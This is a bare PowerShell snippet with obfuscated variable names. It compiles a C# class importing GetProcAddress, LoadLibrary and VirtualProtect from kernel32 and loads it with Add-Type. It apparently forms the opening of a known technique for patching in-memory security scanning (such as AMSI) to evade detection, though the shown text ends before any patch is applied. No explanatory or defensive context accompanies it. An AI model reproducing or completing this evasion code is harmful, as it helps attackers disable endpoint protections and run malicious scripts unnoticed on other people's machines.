$afrcv = @"
using System;
using System.Runtime.InteropServices;
public class afrcv {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);
}
"@
$7amada = [System.Runtime.InteropServices.Marshal]
Add-Type -TypeDefinition $afrcv -passthru